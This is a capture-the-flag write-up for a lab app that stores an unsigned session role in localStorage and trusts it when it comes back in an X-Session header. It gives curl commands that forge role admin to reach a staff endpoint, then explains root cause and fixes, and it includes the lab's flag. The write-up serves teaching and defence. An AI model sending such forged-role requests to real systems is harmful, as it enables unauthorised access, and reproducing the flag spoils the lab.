# Members Area Client-Side Role Trust

## What Is Happening

The [Members Area lab](https://5e4d65182690.pwnbox-lab.com/) logs in `guest/guest`, returns a JSON session object, stores it in `localStorage`, and later sends it back to the server in an `X-Session` header when the user visits the staff area.

The application assumes users cannot promote themselves because the login flow only returns the `guest` role.

## Why It Happens

The server trusts a client-controlled authorization object. After login, the browser stores:

```json
{"login_time":1783532067,"role":"guest","user":"guest"}
```

Later, the staff page does:

```javascript
fetch('/api/staff', {
  headers: { 'X-Session': localStorage.getItem('session') || '' },
})
```

Because the role is neither server-side nor signed, the user can simply change `"role":"guest"` to `"role":"admin"` before the server reads it back.

## Exploit Chain

1. Log in as `guest/guest`.
2. Observe the session JSON stored in `localStorage`.
3. Change the role field.
4. Send the modified session to `/api/staff`.
5. Read the protected response.

## Exact Test

Direct forged request:

```bash
curl -sS "https://5e4d65182690.pwnbox-lab.com/api/staff" \
  -H 'X-Session: {"user":"guest","role":"admin"}'
```

Control request:

```bash
curl -sS "https://5e4d65182690.pwnbox-lab.com/api/staff" \
  -H 'X-Session: {"user":"guest","role":"guest"}'
```

## Expected Signal

- Guest session returns:

```json
{"error":"staff only"}
```

- Forged `role:"staff"` still returns `staff only`.
- Forged `role:"admin"` returns JSON with the flag.

## Result Interpretation

Confirmed bug chain:

```text
Client-stored session object
-> user edits role claim
-> forged X-Session header
-> server trusts unsigned role
-> protected endpoint access
```

## Root Cause

Authorization state was stored and trusted on the client side without integrity protection or server-side verification.

## Impact

- Self-promotion from guest to admin.
- Full bypass of intended role assignment logic.
- In real systems, possible unauthorized access to staff dashboards, admin APIs, or sensitive data.

## Fix

- Store authorization state server-side.
- If tokens are used, sign and verify them.
- Ignore or reject mutable client-supplied role fields.
- Use HttpOnly session cookies or verified signed tokens instead of raw browser storage.

## Key Lesson

If a lab says “the server reads the role back from the browser,” treat that as an immediate trust-boundary smell. Test whether the server verifies integrity or simply believes whatever the client sends.

## Flag

`pwnbox{b3d57f1e3a2c8b0d4e6f7a8b9c0d1e2f}`
